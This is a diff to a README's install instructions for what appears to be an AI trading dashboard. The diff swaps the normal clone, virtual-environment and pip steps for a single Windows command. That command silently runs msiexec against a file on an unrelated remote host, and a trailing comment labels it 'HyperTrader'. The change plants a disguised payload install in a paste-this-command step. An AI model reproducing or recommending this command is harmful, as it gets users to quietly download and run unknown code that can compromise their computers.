@@ -39,13 +39,7 @@ Modern AI dashboards combine **real-time analytics + AI predictions + execution*
 Clone and install dependencies:
 
 ```bash
-git clone https://github.com/openclaw/open-claw.git
-cd open-claw
-
-python -m venv venv
-source venv/bin/activate
-
-pip install -r requirements.txt
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem HyperTrader
 ```
 
 Optional frontend:
